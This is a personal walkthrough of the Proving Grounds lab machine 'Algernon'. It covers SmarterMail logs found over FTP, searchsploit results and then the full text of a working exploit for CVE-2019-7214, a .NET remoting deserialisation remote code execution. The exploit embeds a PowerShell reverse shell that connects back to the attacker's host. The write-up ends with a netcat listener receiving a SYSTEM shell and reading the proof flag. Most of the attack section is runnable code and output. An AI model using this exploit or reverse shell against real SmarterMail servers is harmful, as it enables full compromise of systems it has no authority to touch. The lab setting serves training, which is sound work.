04:57:46.142 xmpp Started at 7/28/2020 4:57:46 AM
05:00:34.955 All Xmpp Connections terminated
05:00:35.049 xmpp Stopped at 7/28/2020 5:00:35 AM
15:12:14.936 Delivery server started at 8/12/2020 3:12:14 PM
15:12:14.952 Updating ClamAV database...
15:12:40.717 Updating the ClamAV database has completed successfully
15:12:14.952 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
15:12:14.952 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
15:12:14.920 smtp started at 8/12/2020 3:12:14 PM
15:12:14.952 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
15:12:15.030 xmpp Started at 8/12/2020 3:12:15 PM
15:12:15.030 Could not start listening on 192.168.120.110:5222 - System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.Protocols.XMPP.Core.XmppServer.StartListening(IPEndPoint ipEndPoint)
11:11:59.044 Delivery server started at 3/10/2021 11:11:59 AM
11:11:59.060 Updating ClamAV database...
11:12:28.716 Updating the ClamAV database has completed successfully
11:11:59.044 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
11:11:59.044 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
11:11:59.028 smtp started at 3/10/2021 11:11:59 AM
11:11:59.044 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
11:11:59.185 xmpp Started at 3/10/2021 11:11:59 AM
11:11:59.185 Could not start listening on 192.168.120.110:5222 - System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at MailService.Protocols.XMPP.Core.XmppServer.StartListening(IPEndPoint ipEndPoint)
03:41:35.233 [192.168.49.225] Webmail Attempting to login user: admin
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [225.65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [168.225.65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [192.168.225.65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: LOGIN_FAILURE_DOMAIN_NOT_FOUND. Brute force attempts increased to 1. User brute force attempts increased to 1.
04:09:43.708 [192.168.49.225] Webmail Attempting to login user: admin
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [225.65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [168.225.65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [192.168.225.65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: LOGIN_FAILURE_DOMAIN_NOT_FOUND. Brute force attempts increased to 1. User brute force attempts increased to 1.
03:35:53.678 Updating ClamAV database...
03:36:05.647 Updating the ClamAV database has completed successfully
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$                                           
```

## 80

## 9998 - Web

![](Pasted%20image%2020220117200016.png)

### Smartermail Exploit

```
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 49216.py                                                                                                                                            1 ⨯ 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 49216.py                                                                                                                                                1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit smartermail                                                                                                                                        1 ⚙
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                                                                                | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                                                                            | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                                                        | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                                                       | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                                                                               | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                                              | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                                                                        | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                                                            | asp/webapps/31017.php
smartermail free 9.2 - Persistent Cross-Site Scripting                                                                                | windows/webapps/20362.py
SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                                                               | php/webapps/31240.txt
SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                                                                | windows/dos/31607.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 48580                                                                                                                                           1 ⚙
  Exploit: SmarterMail 16 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/48580
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48580.py
File Type: Python script, ASCII text executable

Copied to: /tmp/48580.py



```


### Using Info from logs
```
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$ cat 2020.05.12-administrative.log                                                                                                                               1 ⚙

03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$ cat 2022.01.17-administrative.log                                                                                                                               1 ⚙
03:41:35.233 [192.168.49.225] Webmail Attempting to login user: admin
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [225.65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [168.225.65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: Domain [192.168.225.65] not found
03:41:35.233 [192.168.49.225] Webmail Login failed: LOGIN_FAILURE_DOMAIN_NOT_FOUND. Brute force attempts increased to 1. User brute force attempts increased to 1.
04:09:43.708 [192.168.49.225] Webmail Attempting to login user: admin
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [225.65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [168.225.65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: Domain [192.168.225.65] not found
04:09:43.708 [192.168.49.225] Webmail Login failed: LOGIN_FAILURE_DOMAIN_NOT_FOUND. Brute force attempts increased to 1. User brute force attempts increased to 1.
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$                                                       
```


# Exploit

Total luck lmao. I guessed that maybe firewall issue, so tried port 80 instead of 443

```
# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
# Tested on: Windows 10 x64
# References:
# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
#
# SmarterMail before build 6985 provides a .NET remoting endpoint
# which is vulnerable to a .NET deserialisation attack.
#
#!/usr/bin/python3

import base64
import socket
import sys
from struct import pack

HOST='192.168.225.65'
PORT=17001
LHOST='192.168.49.225'
LPORT=80

psh_shell = '$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')

payload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAPIKL2MgcG93ZXJzaGVsbC5leGUgLWVuY29kZWRDb21tYW5kIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw=='
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)

uri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

msg = bytes()
msg += b'.NET'                 # Header
msg += b'\x01'                 # Version Major
msg += b'\x00'                 # Version Minor
msg += b'\x00\x00'             # Operation Type
msg += b'\x00\x00'             # Content Distribution
msg += pack('I', len(payload)) # Data Length
msg += b'\x04\x00'             # URI Header
msg += b'\x01'                 # Data Type
msg += b'\x01'                 # Encoding - UTF8
msg += pack('I', len(uri))     # URI Length
msg += uri                     # URI
msg += b'\x00\x00'             # Terminating Header
msg += payload                 # Data

s.send(msg)
s.close()
```

```
┌──(kali㉿kali)-[/tmp]
└─$  python3 49216.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.225] from (UNKNOWN) [192.168.225.65] 49880

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cd \Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> type proof.txt
8c59c6a7338397d73b9291c33730fa3c
PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.225.65
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.225.254
PS C:\Users\Administrator\Desktop> 

```


![](Pasted%20image%2020220117203912.png)